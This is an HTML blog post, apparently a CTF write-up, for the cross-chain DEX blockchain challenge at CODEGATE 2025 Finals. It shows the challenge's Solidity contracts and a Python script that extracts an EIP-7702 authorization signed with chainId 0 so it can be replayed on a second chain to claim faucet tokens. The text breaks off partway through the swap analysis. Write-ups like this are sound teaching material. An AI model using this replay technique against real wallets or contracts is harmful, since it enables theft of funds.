@@ -1,0 +1,1217 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  
+
+  
+  
+  
+
+  <title>Blockchain Writeup - Codegate Finals 2025 :: teddyctf</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup for DEX, a cross-chain blockchain challenge from CODEGATE 2025 Finals CTF, onsite in South Korea!" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://TheSavageTeddy.github.io/featured/codegate-finals-2025/" />
+
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-J6PB683BSR"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-J6PB683BSR');
+        }
+      </script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
+    integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
+    integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4"
+    crossorigin="anonymous"></script>
+
+
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
+    integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
+    onload="renderMathInElement(document.body, { delimiters: [{left: '$$', right: '$$', display: true}, {left: '\$', right: '\$', display: false}] });">
+    </script>
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://TheSavageTeddy.github.io/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://TheSavageTeddy.github.io/favicon.ico">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="teddyctf" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Blockchain Writeup - Codegate Finals 2025">
+<meta property="og:description" content="Writeup for DEX, a cross-chain blockchain challenge from CODEGATE 2025 Finals CTF, onsite in South Korea!" />
+<meta property="og:url" content="https://TheSavageTeddy.github.io/featured/codegate-finals-2025/" />
+<meta property="og:site_name" content="teddyctf" />
+
+  
+  
+    
+  
+  <meta property="og:image" content="https://TheSavageTeddy.github.io/featured/codegate-finals-2025/teamphoto.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="CTF Writeups" />
+
+  <meta property="article:section" content="writeups" />
+
+  <meta property="article:section" content="crypto" />
+
+  <meta property="article:section" content="onsite" />
+
+
+  <meta property="article:published_time" content="2025-07-15 13:26:40 &#43;1000 AEST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body class="green">
+  
+
+  <div class="container center headings--one-size">
+
+    <header class="header">
+  <div class="header__inner" style="height: 34px;">
+    <img src="/images/teddypfp.jpg" style="max-height: 100%; max-width: 100%; display: block;">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    teddy / TheSavageTeddy
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/contact">Contact</a></li>
+        
+      
+        
+          <li><a href="/featured">Featured Posts</a></li>
+        
+      
+        
+          <li><a href="/posts">Other Posts</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          
+            <li><a href="/about">About</a></li>
+          
+        
+      
+        
+          
+            <li><a href="/contact">Contact</a></li>
+          
+        
+      
+        
+          
+            <li><a href="/featured"><b>Featured Posts</b></a></li>
+          
+        
+      
+        
+          
+            <li><a href="/posts">Other Posts</a></li>
+          
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+    <div class="content">
+      
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://TheSavageTeddy.github.io/featured/codegate-finals-2025/">
+  <img src="https://ctftime.org/media/cache/72/e3/72e30fa751acf026cda1e67366dedc3e.png"  class="left"  style="border-radius: 5px; height: auto; width: 3em; display: inline; vertical-align: middle; "  />
+
+
+ Blockchain Writeup - Codegate Finals 2025</a>
+  </h1>
+  <div class="post-meta">
+    
+      <time class="post-date">
+        Jul 15, 2025 :: teddyctf
+        
+      </time>
+    
+    
+    
+  </div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://TheSavageTeddy.github.io/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="https://TheSavageTeddy.github.io/tags/web3/">web3</a>&nbsp;
+      
+      #<a href="https://TheSavageTeddy.github.io/tags/smart-contract/">smart-contract</a>&nbsp;
+      
+      #<a href="https://TheSavageTeddy.github.io/tags/blockchain/">blockchain</a>&nbsp;
+      
+      #<a href="https://TheSavageTeddy.github.io/tags/writeup/">writeup</a>&nbsp;
+      
+      #<a href="https://TheSavageTeddy.github.io/tags/onsite/">onsite</a>&nbsp;
+      
+      #<a href="https://TheSavageTeddy.github.io/tags/finals/">finals</a>&nbsp;
+      
+    </span>
+  
+  
+  <img src="/featured/codegate-finals-2025/teamphoto.png"
+    class="post-cover"
+    alt=" "
+    title="Cover Image" 
+    style="border: 1.5px solid #78E2A0; border-radius: 5px; padding: 0px; display:block; margin: auto; max-height: 40em; max-width: auto; " />
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="overview">Overview<a href="#overview" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>A few days ago, I had the opportunity to participate in the CODEGATE 2025 Finals CTF. I played with the team <a href="https://ctftime.org/team/280849">🤬🇫🇷🛹🐻</a> (Pissed French Skateboarding Bears), and we managed to place 7th out of 20 teams!</p>
+
+  <img src="./img/scoreboard.png"  class="center"  style="border-radius: 5px; width: 100%"  />
+
+
+<p>In this blog post, I will provide a detailed walkthrough of <code>DEX</code>, an interesting cross-chain blockchain challenge that I managed to get first blood on!</p>
+<p>Enjoy!</p>
+<h1 id="challenges-overview">Challenges Overview<a href="#challenges-overview" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Challenge</strong></th>
+          <th><strong>Category</strong></th>
+          <th><strong>Solves</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><a href="/featured/codegate-finals-2025/#dex---8-solves">DEX</a></td>
+          <td>blockchain</td>
+          <td>8</td>
+      </tr>
+  </tbody>
+</table>
+<h1 id="dex---8-solves-">DEX - 8 solves 🩸<a href="#dex---8-solves-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<blockquote>
+<p>DEX
+I love Web3.0, so I made cross chain dex :)
+nc 16.184.13.125 1337</p></blockquote>
+<p>We are provided with a <a href="/featured/codegate-finals-2025/DEX_codegate_finals_2025.zip">zip file attachment</a> which unzips into 2 main folders. I will briefly highlight the important files below, but we will go into more detail later as well.</p>
+<ul>
+<li><code>src/contracts</code>
+<ul>
+<li><code>Setup.sol</code>
+<ul>
+<li>Challenge setup, contains the requirements for solving the challenge through checks in <code>solve()</code> function.</li>
+</ul>
+</li>
+<li><code>DEX.sol</code>
+<ul>
+<li>Fixed-rate token swapping contract, facilitating swaps between three ERC20 tokens.</li>
+</ul>
+</li>
+<li><code>FaucetLogic.sol</code>
+<ul>
+<li>Token faucet, contains <code>claimToken()</code> function to claim tokens.</li>
+</ul>
+</li>
+<li><code>Token.sol</code>
+<ul>
+<li>Normal ERC20 token, slightly modified so the contract owner can <code>mint</code> and <code>burn</code> tokens.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>src/eth_sandbox</code>
+<ul>
+<li><code>launcher.py</code>
+<ul>
+<li>Deploys challenge contracts and sets up the challenge instance.</li>
+</ul>
+</li>
+<li><code>relayer.py</code>
+<ul>
+<li>Cross-chain relayer (more on this later!)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>To provide some context, there are two different chains, CODE chain and GATE chain. Contracts are deployed on both chains. The <code>DEX</code> contract is both a cross-chain message sender and receiver, allowing communication across chains facilitated through the relayer <code>relayer.py</code>.</p>
+<p>Lets look at the <code>Setup</code> contract.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox"  />
+    <label for="1">
+      <span class="collapsable-code__language">solidity</span>
+      <span class="collapsable-code__title">Setup.sol</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-solidity" ><code>
+pragma solidity ^0.8.25;
+
+import &#34;./DEX.sol&#34;;
+import &#34;./Token.sol&#34;;
+import &#34;./FaucetLogic.sol&#34;;
+
+contract Setup {
+    uint256 public constant CODE_CHAIN = 10;
+    uint256 public constant GATE_CHAIN = 100;
+
+    address public dex;
+    address public tokenA;
+    address public tokenB;
+    address public tokenC;
+    address public faucet;
+    address public faucetLogic;
+    bool public isSolved = false;
+    uint256 public constant DEX_SUPPLY = 600 ether;
+    constructor(address _faucet) {
+        
+        faucetLogic = address(new FaucetLogic());
+        faucet  = _faucet;
+
+        if(block.chainid == CODE_CHAIN) {
+            tokenA = address(new Token(&#34;CODE USDC&#34;, &#34;cUSDC&#34;));
+            tokenB = address(new Token(&#34;CODE PURR&#34;, &#34;cPURR&#34;));
+            tokenC = address(new Token(&#34;CODE MOODENG&#34;, &#34;cMOODENG&#34;));
+        } else {
+            tokenA = address(new Token(&#34;GATE USDC&#34;, &#34;gUSDC&#34;));
+            tokenB = address(new Token(&#34;GATE PURR&#34;, &#34;gPURR&#34;));
+            tokenC = address(new Token(&#34;GATE MOODENG&#34;, &#34;gMOODENG&#34;));
+        }
+
+        Token[] memory tokens = new Token[](3);
+        tokens[0] = Token(tokenA);
+        tokens[1] = Token(tokenB);
+        tokens[2] = Token(tokenC);
+
+        dex = address(new DEX(msg.sender, tokens));
+        Token(tokenA).mint(address(dex), DEX_SUPPLY);
+        Token(tokenB).mint(address(dex), DEX_SUPPLY);
+        Token(tokenC).mint(address(dex), DEX_SUPPLY);
+
+        Token(tokenA).transferOwnership(msg.sender);
+        Token(tokenB).transferOwnership(msg.sender);
+        Token(tokenC).transferOwnership(msg.sender);
+    }
+
+    function getToken() public {
+        if(block.chainid == GATE_CHAIN) {
+            Token(tokenA).transfer(faucet, 100 ether);
+            Token(tokenB).transfer(faucet, 100 ether);
+            Token(tokenC).transfer(faucet, 100 ether);
+        }
+    }
+    function solve() public {
+        require(block.chainid == CODE_CHAIN, &#34;Can be solved only on CODE CHAIN&#34;);
+        require(Token(tokenA).balanceOf(msg.sender) &gt;= DEX_SUPPLY * 2, &#34;Not enough USDC&#34;);
+        require(Token(tokenB).balanceOf(msg.sender) &gt;= DEX_SUPPLY * 2, &#34;Not enough PURR&#34;);
+        require(Token(tokenC).balanceOf(msg.sender) &gt;= DEX_SUPPLY * 2, &#34;Not enough MOODENG&#34;);
+        isSolved = true;
+    }
+}
+</code></pre>
+  </div>
+
+
+<p>It deploys three tokens, the DEX, and mints 600 of each token to the DEX. Some of its behaviour differs based on which chain it was deployed on:</p>
+<ul>
+<li><code>getToken()</code> transfers 100 of each token to <code>faucet</code> if called on the GATE chain, otherwise it does nothing. Note that on the GATE chain this can only be called once, as the Setup contract only has 100 of each token.</li>
+<li>To solve the challenge, we must call <code>solve()</code> on the CODE chain. The solve requirement is that we have double of the initial DEX supply of each token, aka 1200 of each of the three tokens on the CODE chain.</li>
+</ul>
+<h2 id="challenge-first-part---getting-tokens-from-faucet">Challenge first part - getting tokens from faucet<a href="#challenge-first-part---getting-tokens-from-faucet" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Before we look at the DEX contract, let&rsquo;s take a look into how we actually obtain the 100 tokens at the start. Notice that on the GATE chain, <code>getToken()</code> sends the tokens to <code>faucet</code>, not the player.</p>
+<p>Looking at <code>launcher.py</code>, we see that <code>faucet</code> is actually an EOA (not a contract), which is surprising. However, it makes sense after I read the code and realised that <code>faucet</code> is using <a href="https://eips.ethereum.org/EIPS/eip-7702">EIP-7702</a>. <a href="https://netbasal.medium.com/eip-7702-delegated-execution-and-sponsored-transactions-ad7f5ef80257">This</a> is a nice article detailing it.</p>
+<p>Essentially, during challenge deployment, <code>faucet</code> sends a transaction with <code>authorizationList</code> set, essentially setting its own code to <code>FaucetLogic</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">new_launch_instance_action</span>(
+</span></span><span style="display:flex;"><span>    do_deploy: Callable[[Web3, str, str, str, int], str],
+</span></span><span style="display:flex;"><span>) <span style="color:#f92672">-&gt;</span> Action:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">action</span>() <span style="color:#f92672">-&gt;</span> int:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i, node <span style="color:#f92672">in</span> enumerate(node_info):
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>            faucet_logic_addr <span style="color:#f92672">=</span> setup_contract<span style="color:#f92672">.</span>functions<span style="color:#f92672">.</span>faucetLogic()<span style="color:#f92672">.</span>call()
+</span></span><span style="display:flex;"><span>            signed_auth <span style="color:#f92672">=</span> faucet_account<span style="color:#f92672">.</span>sign_authorization({
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;chainId&#34;</span>: <span style="color:#ae81ff">0</span>, 
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;address&#34;</span>: faucet_logic_addr,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;nonce&#34;</span>: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>            })
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>: <span style="color:#75715e">## CODE chain only</span>
+</span></span><span style="display:flex;"><span>                tx_dict[<span style="color:#e6db74">&#34;authorizationList&#34;</span>] <span style="color:#f92672">=</span> [signed_auth]
+</span></span><span style="display:flex;"><span>            signed_tx <span style="color:#f92672">=</span> deployer_account<span style="color:#f92672">.</span>sign_transaction(tx_dict)
+</span></span><span style="display:flex;"><span>            tx_hash <span style="color:#f92672">=</span> web3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>send_raw_transaction(signed_tx<span style="color:#f92672">.</span>raw_transaction)
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">...</span>
+</span></span></code></pre></div><p>It seems like we can just call <code>claimToken()</code> on the faucet on GATE chain to claim the tokens, right?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">25</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;./Token.sol&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">FaucetLogic</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">claimToken</span>(<span style="color:#66d9ef">address</span> _token) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>        Token(_token).transfer(msg.sender, Token(_token).balanceOf(<span style="color:#66d9ef">address</span>(this)));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It turns out, the transaction with <code>authorizationList</code> set is only for CODE chain, meaning on GATE chain, <code>faucet</code> is not using EIP-7702 and hence has no code. And the faucet only has tokens on GATE chain, not CODE chain.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>: <span style="color:#75715e">## CODE chain only</span>
+</span></span><span style="display:flex;"><span>                tx_dict[<span style="color:#e6db74">&#34;authorizationList&#34;</span>] <span style="color:#f92672">=</span> [signed_auth]
+</span></span></code></pre></div><p>So what do we do?</p>
+<p>My initial thought was that we had to do something related to a replay attack across the two different chains, but I didn&rsquo;t quite know how that would work, since with the introduction of <a href="https://eips.ethereum.org/EIPS/eip-155">EIP-155</a>, transaction hashes include the chain id to prevent replay attacks across different chains.</p>
+<p>However, I noticed something strange when the authorization was being signed. Both the chain Id and nonce were both set to 0. It was surprising the chain Id wasn&rsquo;t set to the CODE chain id.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>            signed_auth <span style="color:#f92672">=</span> faucet_account<span style="color:#f92672">.</span>sign_authorization({
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;chainId&#34;</span>: <span style="color:#ae81ff">0</span>, 
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;address&#34;</span>: faucet_logic_addr,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;nonce&#34;</span>: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>            })
+</span></span></code></pre></div><p>I wondered if there was any significance in the chain Id being 0 and found <a href="https://namespaces.chainagnostic.org/eip155/caip10">this</a> which stated:</p>
+<blockquote>
+<p>Special case of EOA</p>
+<p>To express Ethereum account without reference to any specific EIP-155 chain ID, CAIP-10 identifiers can use the special chainId segment 0.</p>
+<p>In the Ethereum account system, “externally owned accounts” (i.e. “offchain” wallets) are controlled by user agents and not by on-chain entities (i.e. deployed or deployable smart contract code). The special chainId 0 SHOULD only be used for accounts that can be used in off-chain contexts, i.e. without the use of an Ethereum node.</p></blockquote>
+<p>It sounded a bit confusing, but essentially, EIP-155 is ignored if chain Id 0 is used. Therefore, signed transactions with chain Id of 0 are replayable on any chain!</p>
+<p>So we can set the authorization list of the faucet on GATE chain by getting the signed authorization on CODE chain, and replaying that on the GATE chain.</p>
+<p>To send a transaction with EIP-7702 authorization list, we can use Foundry&rsquo;s <a href="https://getfoundry.sh/cast/reference/cast-send/"><code>cast send</code></a> with the <code>--auth</code> flag.</p>
+<p>To retrieve and format the signed authorization, I asked ChatGPT to write a script to get the first transaction in the second block and encode it so I could pass the value straight to <code>cast send</code>.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="2" type="checkbox" checked />
+    <label for="2">
+      <span class="collapsable-code__language">python</span>
+      <span class="collapsable-code__title">get_signed_authorization.py</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-python" ><code>
+from web3 import Web3
+import rlp
+from eth_utils import to_bytes, keccak, to_hex
+
+# RLP list encoding expects all values in bytes or integers
+class Authorization(rlp.Serializable):
+    fields = [
+        (&#34;chainId&#34;, rlp.sedes.big_endian_int),
+        (&#34;address&#34;, rlp.sedes.Binary.fixed_length(20)),
+        (&#34;nonce&#34;, rlp.sedes.big_endian_int),
+        (&#34;yParity&#34;, rlp.sedes.big_endian_int),
+        (&#34;r&#34;, rlp.sedes.big_endian_int),
+        (&#34;s&#34;, rlp.sedes.big_endian_int),
+    ]
+
+import os
+# RPC endpoint
+CODE_RPC = os.getenv(&#34;RPCURL_CODE&#34;)
+w3 = Web3(Web3.HTTPProvider(CODE_RPC))
+
+# Get block 0x2 and its transactions
+block = w3.eth.get_block(2, full_transactions=True)
+
+if not block[&#34;transactions&#34;]:
+    print(&#34;❌ No transactions in block 0x2&#34;)
+    exit(1)
+
+tx = block[&#34;transactions&#34;][0]
+
+if &#34;authorizationList&#34; not in tx or not tx[&#34;authorizationList&#34;]:
+    print(&#34;❌ No authorizationList in first transaction&#34;)
+    exit(1)
+
+auth = tx[&#34;authorizationList&#34;][0]
+
+# Extract fields
+chain_id = int(auth[&#34;chainId&#34;], 16)
+address = bytes.fromhex(auth[&#34;address&#34;][2:])
+nonce = int(auth[&#34;nonce&#34;], 16)
+y_parity = int(auth[&#34;yParity&#34;], 16)
+r = int(auth[&#34;r&#34;], 16)
+s = int(auth[&#34;s&#34;], 16)
+
+# RLP encode the auth
+auth_obj = Authorization(chain_id, address, nonce, y_parity, r, s)
+encoded = rlp.encode(auth_obj)
+auth_hex = to_hex(encoded)
+
+print(&#34;✅ Foundry cast send --auth value:&#34;)
+print(f&#34;--auth {auth_hex}&#34;)
+
+</code></pre>
+  </div>
+
+
+<p>Then, we replay the signed authorization on the GATE chain to set the faucet code, allowing us to call <code>claimToken()</code> to get tokens.</p>
+
+  <img src="./img/ss1.png"  class="center"  style="border-radius: 5px; width: 80%"  />
+
+
+
+  <img src="./img/ss2.png"  class="center"  style="border-radius: 5px; width: 80%"  />
+
+
+<p>As shown in the images above, we successfully set the code of faucet on GATE chain.</p>
+<h2 id="challenge-second-part---abusing-cross-chain-swapping-behaviour">Challenge second part - Abusing cross-chain swapping behaviour<a href="#challenge-second-part---abusing-cross-chain-swapping-behaviour" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Now let&rsquo;s look at the DEX contract.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="3" type="checkbox" checked />
+    <label for="3">
+      <span class="collapsable-code__language">solidity</span>
+      <span class="collapsable-code__title">DEX.sol</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-solidity" ><code>
+pragma solidity ^0.8.25;
+
+import &#34;@openzeppelin/contracts/token/ERC20/IERC20.sol&#34;;
+import &#34;./Token.sol&#34;;
+
+contract DEX {
+    Token[] public tokens;
+    uint256 public constant CODE_CHAIN = 10;
+    uint256 public constant GATE_CHAIN = 100;
+    address public immutable relayer;
+    uint256[] public rates = [1_000_000, 200_000, 190_000];
+
+    mapping(bytes32 =&gt; address) public tokenMapping;
+
+    modifier onlyRelayer() {
+        require(msg.sender == relayer, &#34;Only relayer&#34;);
+        _;
+    }
+    
+    enum MessageType {
+        LiquidityRequest,
+        LiquidityResponse,
+        SwapRequest
+    }
+
+    struct Message {
+        MessageType messageType;
+        address from;
+        address receiver;
+        bytes32 srcToken;
+        bytes32 dstToken;
+        uint256 srcChainId;
+        uint256 dstChainId;
+        uint256 amount;
+    }
+
+    event MessageSent(Message message);
+
+    constructor(address _relayer, Token[] memory _tokens) {
+        relayer = _relayer;
+        tokens = _tokens;
+
+        tokenMapping[keccak256(abi.encodePacked(&#34;USDC&#34;))] = address(tokens[0]);
+        tokenMapping[keccak256(abi.encodePacked(&#34;PURR&#34;))] = address(tokens[1]);
+        tokenMapping[keccak256(abi.encodePacked(&#34;MOODENG&#34;))] = address(tokens[2]);
+    }
+
+    function handleMessage(Message calldata message) external payable onlyRelayer {
+
+        assert(message.dstChainId == block.chainid);
+
+        if(message.messageType == MessageType.LiquidityRequest) {
+            emit MessageSent(Message({
+                messageType: MessageType.LiquidityResponse,
+                from: message.from,
+                receiver: message.receiver,
+                srcToken: message.srcToken,
+                dstToken: message.dstToken,
+                srcChainId: message.dstChainId,
+                dstChainId: message.srcChainId,
+                amount: message.amount
+            }));
+        } else if(message.messageType == MessageType.LiquidityResponse) {
+            // handled by relayer
+        } else if(message.messageType == MessageType.SwapRequest) {
+            _swap(address(this), message.receiver, message.amount, message.srcToken, message.dstToken);
+        } else {
+            revert(&#34;Invalid message type&#34;);
+        }
+    }
+
+    function swap(address receiver, bytes32 srcToken, bytes32 dstToken, uint256 amount, bool isCrosschain) external payable {
+        if(isCrosschain) {
+            _crossSwap(msg.sender, receiver, amount, srcToken, dstToken);
+        } else {
+            _swap(msg.sender, receiver, amount, srcToken, dstToken);
+        }
+    }
+
+    function _crossSwap(address from, address receiver, uint256 amount, bytes32 srcToken, bytes32 dstToken) internal {
+        Token srcTokenAddress = Token(tokenMapping[srcToken]);
+        srcTokenAddress.transferFrom(from, address(this), amount);
+
+        emit MessageSent(Message({
+            messageType: MessageType.SwapRequest,
+            from: from,
+            receiver: receiver,
+            srcToken: srcToken,
+            dstToken: dstToken,
+            srcChainId: block.chainid,
+            dstChainId: block.chainid == CODE_CHAIN ? GATE_CHAIN : CODE_CHAIN,
+            amount: amount
+        }));
+    }
+    
+    function _swap(address from, address receiver, uint256 amount, bytes32 srcToken, bytes32 dstToken) internal {
+        uint256 rate = _getRate(srcToken, dstToken);
+        Token srcTokenAddress = Token(tokenMapping[srcToken]);
+        Token dstTokenAddress = Token(tokenMapping[dstToken]);
+        uint256 targetAmount = amount * rate / 1e6;
+        uint256 diffAmount = 0;
+
+        if(dstTokenAddress.balanceOf(address(this)) &lt; targetAmount) {
+            diffAmount = targetAmount - dstTokenAddress.balanceOf(address(this));
+            targetAmount = dstTokenAddress.balanceOf(address(this));
+            amount = _getRate(dstToken, srcToken) * targetAmount / 1e6;
+            emit MessageSent(Message({
+                messageType: MessageType.LiquidityRequest,
+                from: address(this),
+                receiver: receiver,
+                srcToken: srcToken,
+                dstToken: dstToken,
+                srcChainId: block.chainid,
+                dstChainId: block.chainid == CODE_CHAIN ? GATE_CHAIN : CODE_CHAIN,
+                amount: diffAmount
+            }));
+        }
+        if(from != address(this)) {
+            srcTokenAddress.transferFrom(from, address(this), amount);
+        }
+        dstTokenAddress.transfer(receiver, targetAmount);
+    }
+
+    function _getRate(bytes32 srcToken, bytes32 dstToken) internal view returns (uint256) {
+        uint8 srcIdx = _getTokenIndex(srcToken);
+        uint8 dstIdx = _getTokenIndex(dstToken);
+
+        uint256 srcRate = rates[srcIdx];
+        uint256 dstRate = rates[dstIdx];
+
+        return (srcRate * 1e6) / dstRate;
+    }
+
+    function _getTokenIndex(bytes32 token) internal pure returns (uint8) {
+        if (token == keccak256(abi.encodePacked(&#34;USDC&#34;))) return 0;
+        if (token == keccak256(abi.encodePacked(&#34;PURR&#34;))) return 1;
+        if (token == keccak256(abi.encodePacked(&#34;MOODENG&#34;))) return 2;
+        revert(&#34;Unknown token&#34;);
+    }
+
+    function getTokenAddress(string memory symbol) public view returns (address) {
+        return tokenMapping[keccak256(abi.encodePacked(symbol))];
+    }
+}
+</code></pre>
+  </div>
+
+
+<p>The contract facilitates swapping between 3 tokens, USDC, PURR and MOODENG with constant rates.</p>
+<p>The rates are:</p>
+<ul>
+<li>1 USDC = 1 USDC</li>
+<li>1 PURR = 0.2 USDC</li>
+<li>1 MOODENG = 0.19 USDC</li>
+</ul>
+<p>This is done through the <code>swap</code> function, which has a <code>isCrosschain</code> flag to specify whether the receiver would receive the tokens on the current chain, or the opposite chain, and calls <code>_swap</code> or <code>_crossSwap</code> respectively.</p>
+<p>For example, you could swap 1 USDC on the GATE chain for 5 PURR on the CODE chain. You can also swap the same token, so you could swap 1 USDC on GATE chain for 1 USDC on CODE chain, essentially bridging the token.</p>
+<p>Cross-chain messaging works as the DEX both acts as a cross-chain message sender and receiver. Cross-chain messages are sent through emitting <code>MessageSent</code> events, which are then processed by the relayer off-chain, and the relayer relays these messages to the DEX contract on the other chain by calling <code>handleMessage</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">listen_message_sent_async</span>(src_contract, dst_contract, chain_id, tokens, stop_event):
+</span></span><span style="display:flex;"><span>        event_filter <span style="color:#f92672">=</span> src_contract<span style="color:#f92672">.</span>events<span style="color:#f92672">.</span>MessageSent<span style="color:#f92672">.</span>create_filter(from_block<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;latest&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> stop_event<span style="color:#f92672">.</span>is_set():
+</span></span><span style="display:flex;"><span>            events <span style="color:#f92672">=</span> event_filter<span style="color:#f92672">.</span>get_new_entries()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> events:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> event <span style="color:#f92672">in</span> events:
+</span></span><span style="display:flex;"><span>                    event_args <span style="color:#f92672">=</span> event[<span style="color:#e6db74">&#39;args&#39;</span>]
